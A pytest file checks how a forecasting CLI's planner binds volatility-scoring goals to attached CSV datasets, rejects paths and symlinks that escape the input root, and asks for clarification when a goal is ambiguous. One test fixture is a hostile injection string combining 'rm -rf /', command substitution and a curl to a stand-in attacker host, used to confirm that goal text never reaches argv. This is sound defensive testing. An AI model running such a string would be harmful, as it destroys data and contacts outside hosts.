"""Dataset and goal binding for the deterministic planner, on the live catalog."""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

from fx1.harness import Harness
from fx1.honesty import validate_fx1_output
from fx1.interactive.contracts import CapabilityCatalog, build_argv, contains_shell_metacharacters
from fx1.interactive.planner import (
    DatasetRef,
    ExecutionPlan,
    make_step_key,
    plan_goal,
    validate_plan,
)

_ROOT = Path(__file__).resolve().parents[2]
_GOAL = "Check whether my volatility forecasts are calibrated using QLIKE"
_SCORE_QUESTION = (
    "Which score: volatility (QLIKE), quantile (pinball/CRPS) or probability (Brier/ECE)?"
)
_ATTACH = "attach a CSV/Parquet with /data attach <path>"
_INJECTION = "volatility; rm -rf / $(touch pwned) && curl http://evil.example/\u202e\x00"


@pytest.fixture(scope="module")
def live_catalog(tmp_path_factory: pytest.TempPathFactory) -> CapabilityCatalog:
    config = tmp_path_factory.mktemp("fx1-config")
    env = {**os.environ, "PYTHONPATH": str(_ROOT / "src"), "NO_COLOR": "1", "TERM": "dumb"}
    env["FX1_CONFIG_DIR"] = str(config)
    env["FX1_SESSION_DIR"] = str(config / "sessions")
    proc = subprocess.run(  # noqa: S603 — fixed local argv
        [
            sys.executable,
            "-m",
            "dipcatcher_cli",
            "capabilities",
            "list",
            "--json",
            "--executable-only",
        ],
        capture_output=True,
        text=True,
        env=env,
        cwd=_ROOT,
        timeout=120,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr[-2000:]
    return CapabilityCatalog.from_json(proc.stdout)


@pytest.fixture(autouse=True)
def _isolated_dirs(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("FX1_CONFIG_DIR", str(tmp_path / "fx1-config"))
    monkeypatch.setenv("FX1_SESSION_DIR", str(tmp_path / "fx1-sessions"))
    monkeypatch.setenv("NO_COLOR", "1")
    monkeypatch.setenv("TERM", "dumb")
    monkeypatch.setenv("FORCE_COLOR", "0")


def _roots(tmp_path: Path) -> dict[str, list[Path]]:
    input_root = tmp_path / "input"
    output_root = tmp_path / "output"
    input_root.mkdir()
    output_root.mkdir()
    return {"input": [input_root], "output_dir": [output_root], "config": [_ROOT]}


def _vol_csv(path: Path, rows: int = 32) -> None:
    lines = ["timestamp,realized,forecast_var"]
    for index in range(rows):
        day = index // 24 + 1
        hour = index % 24
        lines.append(f"2020-01-{day:02d}T{hour:02d}:00:00+00:00,1.0,1.0")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def _ref(path: Path) -> DatasetRef:
    return DatasetRef(str(path), "csv", "file")


def _ids(plan: ExecutionPlan) -> list[str]:
    return [step.capability_id for step in plan.steps]


def test_volatility_goal_binds_the_dataset_and_drops_the_synthetic_lane(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    csv_path = roots["input"][0] / "my_vol.csv"
    _vol_csv(csv_path)
    plan = plan_goal(_GOAL, live_catalog, datasets=(_ref(csv_path),), roots=roots)
    again = plan_goal(_GOAL, live_catalog, datasets=(_ref(csv_path),), roots=roots)
    assert _ids(plan) == ["score-forecasts"]
    assert plan.to_dict() == again.to_dict()
    step = plan.steps[0]
    assert step.args["--task"] == "volatility"
    assert Path(str(step.args["--data"])) == csv_path.resolve()
    assert Path(str(step.args["--out-dir"])) == roots["output_dir"][0].resolve()
    assert "--available-time-col" not in step.args
    assert "--forecast-col" not in step.args
    assert step.args["--time-col"] == "timestamp"
    assert step.step_key == make_step_key(step.capability_id, step.args)
    assert "inferred volatility because the goal matched" in step.rationale
    assert "qlike" in step.rationale
    assert str(csv_path.resolve()) in step.rationale
    text = plan.describe()
    assert str(csv_path.resolve()) in text
    assert "QLIKE" in text
    assert "volatility" in text
    assert validate_fx1_output(text) == text
    assert validate_plan(plan, live_catalog, max_steps=4, budget_s=None, roots=roots) == []
    cap = live_catalog.get("score-forecasts")
    assert cap is not None
    argv = build_argv(cap, step.args, roots=roots)
    assert argv[0] == "score-forecasts"
    assert "--available-time-col" not in argv
    assert not any(contains_shell_metacharacters(token) for token in argv)


def test_bound_plan_executes_and_verifies_the_receipt(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    csv_path = roots["input"][0] / "my_vol.csv"
    _vol_csv(csv_path)
    plan = plan_goal(_GOAL, live_catalog, datasets=(_ref(csv_path),), roots=roots)
    cap = live_catalog.get("score-forecasts")
    assert cap is not None and plan.steps
    argv = build_argv(cap, plan.steps[0].args, roots=roots)
    result = Harness().run("score-forecasts", extra_args=argv[1:])
    assert result.exit_code == 0, result.stderr[-2000:]
    assert "point-in-time validity is NOT verified" in result.stdout
    match = re.search(r"^receipt=(.+)$", result.stdout, re.MULTILINE)
    assert match is not None
    receipt = Path(match.group(1))
    assert receipt.is_file()
    assert receipt.resolve().is_relative_to(roots["output_dir"][0].resolve())
    verified = Harness().run("verify-receipt", extra_args=[str(receipt)])
    assert verified.exit_code == 0, verified.stderr[-2000:]
    body = json.loads(receipt.read_text(encoding="utf-8"))
    assert body["data_label"] == "file"
    assert body["live_pnl_claim"] is False
    payload = body["payload"]
    assert payload["data_label"] == "file"
    assert payload["task"] == "volatility"
    assert payload["scores"]["qlike"] == pytest.approx(0.0, abs=1e-9)
    assert "sharpe" not in json.dumps(body).lower()


def test_missing_or_ambiguous_task_asks_which_score(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    csv_path = roots["input"][0] / "my_vol.csv"
    _vol_csv(csv_path, rows=1)
    datasets = (_ref(csv_path),)
    none = plan_goal("score my forecasts please", live_catalog, datasets=datasets, roots=roots)
    assert none.steps == []
    assert any(
        item.code == "needs_input" and item.detail == _SCORE_QUESTION for item in none.exclusions
    )
    both = plan_goal(
        "score my volatility forecasts with qlike and pinball",
        live_catalog,
        datasets=datasets,
        roots=roots,
    )
    assert both.steps == []
    assert any(
        item.code == "needs_input" and item.detail == _SCORE_QUESTION for item in both.exclusions
    )
    assert "vol-bench" not in _ids(both)


def test_several_datasets_bind_only_when_the_goal_names_one_file(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    first = roots["input"][0] / "my_vol.csv"
    second = roots["input"][0] / "other.csv"
    _vol_csv(first, rows=1)
    _vol_csv(second, rows=1)
    datasets = (_ref(first), _ref(second))
    ambiguous = plan_goal(_GOAL, live_catalog, datasets=datasets, roots=roots)
    assert ambiguous.steps == []
    assert any(
        item.code == "needs_input" and "my_vol.csv" in item.detail and "other.csv" in item.detail
        for item in ambiguous.exclusions
    )
    named = plan_goal(f"{_GOAL} use other.csv", live_catalog, datasets=datasets, roots=roots)
    assert _ids(named) == ["score-forecasts"]
    assert Path(str(named.steps[0].args["--data"])) == second.resolve()
    decoy = plan_goal(f"{_GOAL} notmy_vol.csv", live_catalog, datasets=datasets, roots=roots)
    assert decoy.steps == []
    fragment = plan_goal(f"{_GOAL} vol.csv", live_catalog, datasets=datasets, roots=roots)
    assert fragment.steps == []


def test_dataset_outside_the_input_root_is_not_used(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    outside = tmp_path / "outside.csv"
    _vol_csv(outside, rows=1)
    plan = plan_goal(_GOAL, live_catalog, datasets=(_ref(outside),), roots=roots)
    assert plan.steps == []
    assert any(
        item.code == "invalid_args" and item.detail == "path_escape:--data"
        for item in plan.exclusions
    )
    assert "vol-bench" not in _ids(plan)
    link = roots["input"][0] / "link.csv"
    link.symlink_to(outside)
    escaped = plan_goal(_GOAL, live_catalog, datasets=(_ref(link),), roots=roots)
    assert escaped.steps == []
    assert any(item.detail == "path_escape:--data" for item in escaped.exclusions)


def test_synthetic_lane_is_kept_only_when_the_goal_asks_for_it(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    csv_path = roots["input"][0] / "my_vol.csv"
    _vol_csv(csv_path, rows=1)
    dropped = plan_goal(_GOAL, live_catalog, datasets=(_ref(csv_path),), roots=roots)
    assert _ids(dropped) == ["score-forecasts"]
    kept = plan_goal(
        "Run a synthetic self-test of my volatility forecasts using QLIKE",
        live_catalog,
        datasets=(_ref(csv_path),),
        roots=roots,
    )
    assert _ids(kept) == ["score-forecasts", "vol-bench"]
    assert any("SYNTHETIC" in note for note in kept.notes)
    assert str(csv_path.resolve()) not in json.dumps(dict(kept.steps[1].args))
    assert validate_fx1_output(kept.describe()) == kept.describe()


def test_adversarial_goal_text_never_reaches_argv(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    csv_path = roots["input"][0] / "my_vol.csv"
    _vol_csv(csv_path, rows=1)
    goal = f"Check whether my volatility forecasts are calibrated using QLIKE {_INJECTION}"
    plan = plan_goal(goal, live_catalog, datasets=(_ref(csv_path),), roots=roots)
    assert _ids(plan) == ["score-forecasts"]
    assert plan.steps[0].args["--task"] == "volatility"
    cap = live_catalog.get("score-forecasts")
    assert cap is not None
    argv = build_argv(cap, plan.steps[0].args, roots=roots)
    blob = "\n".join(argv)
    for needle in (";", "|", "`", "$(", "rm -rf", "evil.example", "\u202e", "\x00", "pwned"):
        assert needle not in blob
    assert not any(contains_shell_metacharacters(token) for token in argv)


def test_no_attached_dataset_asks_for_one_and_does_not_substitute_synthetic(
    live_catalog: CapabilityCatalog, tmp_path: Path
) -> None:
    roots = _roots(tmp_path)
    plan = plan_goal(_GOAL, live_catalog, roots=roots)
    assert plan.steps == []
    assert any(item.code == "needs_dataset" and item.detail == _ATTACH for item in plan.exclusions)
    assert "vol-bench" not in _ids(plan)
